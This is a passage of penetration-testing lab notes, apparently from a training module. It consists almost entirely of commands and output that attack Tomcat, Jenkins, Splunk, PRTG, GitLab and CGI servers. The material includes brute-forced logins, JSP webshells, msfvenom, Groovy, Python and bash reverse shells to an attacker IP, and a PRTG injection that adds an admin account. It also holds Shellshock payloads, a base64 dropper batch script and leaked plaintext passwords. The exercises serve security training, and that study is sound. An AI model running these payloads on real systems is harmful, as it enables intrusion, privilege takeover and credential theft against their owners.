[-] 10.129.201.58:8180 - LOGIN FAILED: role1:role1 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:root (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:tomcat (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:s3cret (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:vagrant (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:admin (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:manager (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:role1 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:root (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:tomcat (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:s3cret (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:vagrant (Incorrect)
[+] 10.129.201.58:8180 - Login Successful: tomcat:admin
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
```
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set PROXIES HTTP:127.0.0.1:8080

PROXIES => HTTP:127.0.0.1:8080


msf6 auxiliary(scanner/http/tomcat_mgr_login) > run

[!] No active DB -- Credential data will not be saved!
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:admin (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:manager (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:role1 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:root (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:tomcat (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:s3cret (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:vagrant (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:admin (Incorrect)
```
```
mdmithu@htb[/htb]$ echo YWRtaW46dmFncmFudA== |base64 -d

admin:vagrant
```
```
mdmithu@htb[/htb]$ python3 mgr_brute.py -U http://web01.inlanefreight.local:8180/ -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt

[+] Atacking.....

[+] Success!!
[+] Username : b'tomcat'
[+] Password : b'admin'
```
#### Tomcat Manager - WAR File Upload
```
mdmithu@htb[/htb]$ wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
mdmithu@htb[/htb]$ zip -r backup.war cmd.jsp 

  adding: cmd.jsp (deflated 81%)

```
```
mdmithu@htb[/htb]$ curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id

<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
Command: id<BR>
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)

</pre>
</BODY></HTML>
```
```
mdmithu@htb[/htb]$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war

Payload size: 1098 bytes
Final size of war file: 1098 bytes
```
```
mdmithu@htb[/htb]$ nc -lnvp 4443

listening on [any] 4443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.201.58] 45224


id

uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
```
```
mdmithu@htb[/htb]$ python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml 

Getting resource at ajp13://app-dev.inlanefreight.local:8009/asdf
----------------------------
<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to Tomcat
  </description>

</web-app>
```
## Jenkins - Discovery & Enumeration
## Attacking Jenkins
#### Script Console

```
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```
```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
```
mdmithu@htb[/htb]$ nc -lvnp 8443

listening on [any] 8443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.201.58] 57844

id

uid=0(root) gid=0(root) groups=0(root)

/bin/bash -i

root@app02:/var/lib/jenkins3#
```
```
def cmd = "cmd.exe /c dir".execute();
println("${cmd.text}");

```
```
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
## Splunk - Discovery & Enumeration
```
mdmithu@htb[/htb]$ sudo nmap -sV 10.129.201.50

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-22 08:43 EDT
Nmap scan report for 10.129.201.50
Host is up (0.11s latency).
Not shown: 991 closed ports
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8000/tcp open  ssl/http      Splunkd httpd
8080/tcp open  http          Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)
8089/tcp open  ssl/http      Splunkd httpd
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.22 seconds
```
## Attacking Splunk

```
mdmithu@htb[/htb]$ tree splunk_shell/

splunk_shell/
├── bin
└── default

2 directories, 0 files
```
```
mdmithu@htb[/htb]$ cat inputs.conf 

[script://./bin/rev.py]
disabled = 0  
interval = 10  
sourcetype = shell 

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```
```
mdmithu@htb[/htb]$ tar -cvzf updater.tar.gz splunk_shell/

splunk_shell/
splunk_shell/bin/
splunk_shell/bin/rev.py
splunk_shell/bin/run.bat
splunk_shell/bin/run.ps1
splunk_shell/default/
splunk_shell/default/inputs.conf
```
```
mdmithu@htb[/htb]$ sudo nc -lnvp 443

listening on [any] 443 ...
```
```
mdmithu@htb[/htb]$ sudo nc -lnvp 443

listening on [any] 443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.201.50] 53145


PS C:\Windows\system32> whoami

nt authority\system


PS C:\Windows\system32> hostname

APP03


PS C:\Windows\system32>
```
```
import sys,socket,os,pty

ip="10.10.14.15"
port="443"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')
```
## PRTG Network Monitor

```
mdmithu@htb[/htb]$ sudo nmap -sV -p- --open -T4 10.129.201.50

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-22 15:41 EDT
Stats: 0:00:00 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 0.06% done
Nmap scan report for 10.129.201.50
Host is up (0.11s latency).
Not shown: 65492 closed ports, 24 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8000/tcp  open  ssl/http      Splunkd httpd
8080/tcp  open  http          Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)
8089/tcp  open  ssl/http      Splunkd httpd
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
```
mdmithu@htb[/htb]$ curl -s http://10.129.201.50:8080/index.htm -A "Mozilla/5.0 (compatible;  MSIE 7.01; Windows NT 5.0)" | grep version

  <link rel="stylesheet" type="text/css" href="/css/prtgmini.css?prtgversion=17.3.33.2830__" media="print,screen,projection" />
<div><h3><a target="_blank" href="https://blog.paessler.com/new-prtg-release-21.3.70-with-new-azure-hpe-and-redfish-sensors">New PRTG release 21.3.70 with new Azure, HPE, and Redfish sensors</a></h3><p>Just a short while ago, I introduced you to PRTG Release 21.3.69, with a load of new sensors, and now the next version is ready for installation. And this version also comes with brand new stuff!</p></div>
    <span class="prtgversion">&nbsp;PRTG Network Monitor 17.3.33.2830 </span>
```
```
test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
```
```
mdmithu@htb[/htb]$ sudo crackmapexec smb 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG! 

SMB         10.129.201.50   445    APP03            [*] Windows 10.0 Build 17763 (name:APP03) (domain:APP03) (signing:False) (SMBv1:False)
SMB         10.129.201.50   445    APP03            [+] APP03\prtgadm1:Pwn3d_by_PRTG! (Pwn3d!)
```
## osTicket
(https://dehashed.com/)['https://dehashed.com/']
```
mdmithu@htb[/htb]$ sudo python3 dehashed.py -q inlanefreight.local -p

id : 5996447501
email : julie.clayton@inlanefreight.local
username : jclayton
password : JulieC8765!
hashed_password : 
name : Julie Clayton
vin : 
address : 
phone : 
database_name : ModBSolutions


id : 7344467234
email : kevin@inlanefreight.local
username : kgrimes
password : Fish1ng_s3ason!
hashed_password : 
name : Kevin Grimes
vin : 
address : 
phone : 
database_name : MyFitnessPal

<SNIP>
```
```
mdmithu@htb[/htb]$ cat ilfreight_subdomains

vpn.inlanefreight.local
support.inlanefreight.local
ns1.inlanefreight.local
mail.inlanefreight.local
apps.inlanefreight.local
ftp.inlanefreight.local
dev.inlanefreight.local
ir.inlanefreight.local
auth.inlanefreight.local
careers.inlanefreight.local
portal-stage.inlanefreight.local
dns1.inlanefreight.local
dns2.inlanefreight.local
meet.inlanefreight.local
portal-test.inlanefreight.local
home.inlanefreight.local
legacy.inlanefreight.local

```
## Gitlab - Discovery & Enumeration

```
http://gitlab.inlanefreight.local:8081/admin/application_settings/general
http://gitlab.inlanefreight.local:8081/users/sign_in
http://gitlab.inlanefreight.local:8081/root/inlanefreight-dev

```
#### Enumeration

```
mdmithu@htb[/htb]$ http://gitlab.inlanefreight.local:8081/explore

```
## Attacking GitLab

```
mdmithu@htb[/htb]$ ./gitlab_userenum.sh --url http://gitlab.inlanefreight.local:8081/ --userlist users.txt

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                         GitLab User Enumeration Script
                                 Version 1.0

Description: It prints out the usernames that exist in your victim's GitLab CE instance

Disclaimer: Do not run this script against GitLab.com! Also keep in mind that this PoC is meant only
for educational purpose and ethical use. Running it against systems that you do not own or have the
right permission is totally on your own risk.

Author: @4DoniiS [https://github.com/4D0niiS]
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


LOOP
200
[+] The username root exists!
LOOP
302
LOOP
302
LOOP
200
[+] The username bob exists!
LOOP
302

```
```
mdmithu@htb[/htb]$ python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f '

[1] Authenticating
Successfully Authenticated
[2] Creating Payload 
[3] Creating Snippet and Uploading
[+] RCE Triggered !!
```
```
mdmithu@htb[/htb]$ nc -lnvp 8443

listening on [any] 8443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.201.88] 60054

git@app04:~/gitlab-workhorse$ id

id
uid=996(git) gid=997(git) groups=997(git)

git@app04:~/gitlab-workhorse$ ls

ls
VERSION
config.toml
flag_gitlab.txt
sockets
```
## Attacking Tomcat CGI

```
http://example.com/cgi-bin/booksearch.cgi?action=title&query=the+great+gatsby
http://example.com/cgi-bin/booksearch.cgi?action=author&query=fitzgerald

```
#### Enumeration
```
mdmithu@htb[/htb]$ nmap -p- -sC -Pn 10.129.204.227 --open 

Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-23 13:57 SAST
Nmap scan report for 10.129.204.227
Host is up (0.17s latency).
Not shown: 63648 closed tcp ports (conn-refused), 1873 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
22/tcp    open  ssh
| ssh-hostkey: 
|   2048 ae19ae07ef79b7905f1a7b8d42d56099 (RSA)
|   256 382e76cd0594a6e717d1808165262544 (ECDSA)
|_  256 35096912230f11bc546fddf797bd6150 (ED25519)
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
8009/tcp  open  ajp13
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp  open  http-proxy
|_http-title: Apache Tomcat/9.0.17
|_http-favicon: Apache Tomcat
47001/tcp open  winrm

Host script results:
| smb2-time: 
|   date: 2023-03-23T11:58:42
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required

Nmap done: 1 IP address (1 host up) scanned in 165.25 seconds
```
```
mdmithu@htb[/htb]$ ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__/\ /\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          /_/    /_/   /___/    /_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.204.227:8080/cgi/FUZZ.cmd
 :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

:: Progress: [4614/4614] :: Job [1/1] :: 223 req/sec :: Duration: [0:00:20] :: Errors: 0 ::

```
```
mdmithu@htb[/htb]$ ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__/\ /\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          /_/    /_/   /___/    /_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.204.227:8080/cgi/FUZZ.bat
 :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 200, Size: 81, Words: 14, Lines: 2, Duration: 234ms]
    * FUZZ: welcome

:: Progress: [4614/4614] :: Job [1/1] :: 226 req/sec :: Duration: [0:00:20] :: Errors: 0 ::

```
```
mdmithu@htb[/htb]$ http://10.129.204.227:8080/cgi/welcome.bat?&dir
# http://10.129.204.227:8080/cgi/welcome.bat?&set

Welcome to CGI, this section is not functional yet. Please return to home page.
AUTH_TYPE=
COMSPEC=C:\Windows\system32\cmd.exe
CONTENT_LENGTH=
CONTENT_TYPE=
GATEWAY_INTERFACE=CGI/1.1
HTTP_ACCEPT=text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
HTTP_ACCEPT_ENCODING=gzip, deflate
HTTP_ACCEPT_LANGUAGE=en-US,en;q=0.5
HTTP_HOST=10.129.204.227:8080
HTTP_USER_AGENT=Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.JS;.WS;.MSC
PATH_INFO=
PROMPT=$P$G
QUERY_STRING=&set
REMOTE_ADDR=10.10.14.58
REMOTE_HOST=10.10.14.58
REMOTE_IDENT=
```
```
mdmithu@htb[/htb]$ http://10.129.204.227:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe
mdmithu@htb[/htb]$ http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe

```
## Attacking Common Gateway Interface (CGI) Applications - Shellshock

```
$ env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"
```
```
$ env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"

not vulnerable
```
```
mdmithu@htb[/htb]$ gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.204.231/cgi-bin/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              cgi
[+] Timeout:                 10s
===============================================================
2023/03/23 09:26:04 Starting gobuster in directory enumeration mode
===============================================================
/access.cgi           (Status: 200) [Size: 0]
                                             
===============================================================
2023/03/23 09:26:29 Finished

```
```
mdmithu@htb[/htb]$ curl -i http://10.129.204.231/cgi-bin/access.cgi

HTTP/1.1 200 OK
Date: Thu, 23 Mar 2023 13:28:55 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 0
Content-Type: text/html
```
```
mdmithu@htb[/htb]$ curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.204.231/cgi-bin/access.cgi

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
ftp:x:112:119:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
kim:x:1000:1000:,,,:/home/kim:/bin/bash

```
```
mdmithu@htb[/htb]$ curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi
```
```
mdmithu@htb[/htb]$ sudo nc -lvnp 7777

listening on [any] 7777 ...
connect to [10.10.14.38] from (UNKNOWN) [10.129.204.231] 52840
bash: cannot set terminal process group (938): Inappropriate ioctl for device
bash: no job control in this shell
www-data@htb:/usr/lib/cgi-bin$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@htb:/usr/lib/cgi-bin$

```
## Attacking Thick Client Applications

```
C:\Apps>.\Restart-OracleService.exe
C:\Apps>

```
```
C:\Apps>dir C:\Users\cybervaca\AppData\Local\Temp\2

...SNIP...
04/03/2023  02:09 PM         1,730,212 6F39.bat
04/03/2023  02:09 PM                 0 6F39.tmp
```
```
@shift /0
@echo off

if %username% == matt goto correcto
if %username% == frankytech goto correcto
if %username% == ev4si0n goto correcto
goto error

:correcto
echo TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA > c:\programdata\oracle.txt
echo AAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4g >> c:\programdata\oracle.txt
<SNIP>
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> c:\programdata\oracle.txt

echo $salida = $null; $fichero = (Get-Content C:\ProgramData\oracle.txt) ; foreach ($linea in $fichero) {$salida += $linea }; $salida = $salida.Replace(" ",""); [System.IO.File]::WriteAllBytes("c:\programdata\restart-service.exe", [System.Convert]::FromBase64String($salida)) > c:\programdata\monta.ps1
powershell.exe -exec bypass -file c:\programdata\monta.ps1
del c:\programdata\monta.ps1
del c:\programdata\oracle.txt
c:\programdata\restart-service.exe
del c:\programdata\restart-service.exe
```
```
@shift /0
@echo off

echo TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA > c:\programdata\oracle.txt
echo AAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4g >> c:\programdata\oracle.txt
<SNIP>
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> c:\programdata\oracle.txt

echo $salida = $null; $fichero = (Get-Content C:\ProgramData\oracle.txt) ; foreach ($linea in $fichero) {$salida += $linea }; $salida = $salida.Replace(" ",""); [System.IO.File]::WriteAllBytes("c:\programdata\restart-service.exe", [System.Convert]::FromBase64String($salida)) > c:\programdata\monta.ps1
```
```
C:\>  cat C:\programdata\monta.ps1

$salida = $null; $fichero = (Get-Content C:\ProgramData\oracle.txt) ; foreach ($linea in $fichero) {$salida += $linea }; $salida = $salida.Replace(" ",""); [System.IO.File]::WriteAllBytes("c:\programdata\restart-service.exe", [System.Convert]::FromBase64String($salida))

```
```
C:\>  ls C:\programdata\

Mode                LastWriteTime         Length Name
<SNIP>
-a----        3/24/2023   1:01 PM            273 monta.ps1
-a----        3/24/2023   1:01 PM         601066 oracle.txt
-a----        3/24/2023   1:17 PM         432273 restart-service.exe
```
```
C:\>  .\restart-service.exe

    ____            __             __     ____                  __
   / __ \___  _____/ /_____ ______/ /_   / __ \_________ ______/ /__
  / /_/ / _ / ___/ __/ __ `/ ___/ __/  / / / / ___/ __ `/ ___/ / _ \
 / _, _/  __(__  ) /_/ /_/ / /  / /_   / /_/ / /  / /_/ / /__/ /  __/
/_/ |_|\___/____/\__/\__,_/_/   \__/   \____/_/   \__,_/\___/_/\___/

                                                by @HelpDesk 2010


PS C:\ProgramData>

```
```
C:\> C:\TOOLS\Strings\strings64.exe .\restart-service_00000000001E0000.bin

<SNIP>
"#M
z\V
).NETFramework,Version=v4.0,Profile=Client
FrameworkDisplayName
.NET Framework 4 Client Profile
<SNIP>

```
```
de4dot v3.1.41592.3405

Detected Unknown Obfuscator (C:\Users\cybervaca\Desktop\restart-service_00000000001E0000.bin)
Cleaning C:\Users\cybervaca\Desktop\restart-service_00000000001E0000.bin
Renaming all obfuscated symbols
Saving C:\Users\cybervaca\Desktop\restart-service_00000000001E0000-cleaned.bin


Press any key to exit...
```
## Exploiting Web Vulnerabilities in Thick-Client Applications

```
C:\> echo 10.10.10.174    server.fatty.htb >> C:\Windows\System32\drivers\etc\hosts
```
```
C:\> ls fatty-client\

<SNIP>
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       10/30/2019  12:10 PM                htb
d-----       10/30/2019  12:10 PM                META-INF
d-----        4/26/2017  12:09 AM                org
------       10/30/2019  12:10 PM           1550 beans.xml
------       10/30/2019  12:10 PM           2230 exit.png
------       10/30/2019  12:10 PM           4317 fatty.p12
------       10/30/2019  12:10 PM            831 log4j.properties
------        4/26/2017  12:08 AM            299 module-info.class
------       10/30/2019  12:10 PM          41645 spring-beans-3.0.xsd
```
```
C:\> ls fatty-client\ -recurse | Select-String "8000" | Select Path, LineNumber | Format-List

Path       : C:\Users\cybervaca\Desktop\fatty-client\beans.xml
LineNumber : 13
```
```
C:\> cat fatty-client\beans.xml

<SNIP>
<!-- Here we have an constructor based injection, where Spring injects required arguments inside the
         constructor function. -->
   <bean id="connectionContext" class = "htb.fatty.shared.connection.ConnectionContext">
      <constructor-arg index="0" value = "server.fatty.htb"/>
      <constructor-arg index="1" value = "8000"/>
   </bean>

<!-- The next to beans use setter injection. For this kind of injection one needs to define an default
constructor for the object (no arguments) and one needs to define setter methods for the properties. -->
   <bean id="trustedFatty" class = "htb.fatty.shared.connection.TrustedFatty">
      <property name = "keystorePath" value = "fatty.p12"/>
   </bean>

   <bean id="secretHolder" class = "htb.fatty.shared.connection.SecretHolder">
      <property name = "secret" value = "clarabibiclarabibiclarabibi"/>
   </bean>
<SNIP>
```
```
C:\> cat fatty-client\META-INF\MANIFEST.MF

Manifest-Version: 1.0
Archiver-Version: Plexus Archiver
Built-By: root
Sealed: True
Created-By: Apache Maven 3.3.9
Build-Jdk: 1.8.0_232
Main-Class: htb.fatty.client.run.Starter

Name: META-INF/maven/org.slf4j/slf4j-log4j12/pom.properties
SHA-256-Digest: miPHJ+Y50c4aqIcmsko7Z/hdj03XNhHx3C/pZbEp4Cw=

Name: org/springframework/jmx/export/metadata/ManagedOperationParamete
 r.class
SHA-256-Digest: h+JmFJqj0MnFbvd+LoFffOtcKcpbf/FD9h2AMOntcgw=
<SNIP>

```
```
        powershell
C:\> cd .\fatty-client
C:\> jar -cmf .\META-INF\MANIFEST.MF ..\fatty-client-new.jar *
```
```
C:\> mkdir raw
C:\> cp fatty-client-new.jar raw\fatty-client-new-2.jar

```
```
C:\> mv -Force fatty-client-new.jar.src\htb\fatty\client\gui\*.class raw\htb\fatty\client\gui\
```
```
        powershell
C:\> cd raw
C:\> jar -cmf META-INF\MANIFEST.MF traverse.jar .
```
```
C:\> ls C:\Users\cybervaca\Desktop\

...SNIP...
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        3/25/2023  11:38 AM       10827452 fatty-server.jar
```
## ColdFusion - Discovery & Enumeration

```
mdmithu@htb[/htb]$ nmap -p- -sC -Pn 10.129.247.30 --open

Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-13 11:45 GMT
Nmap scan report for 10.129.247.30
Host is up (0.028s latency).
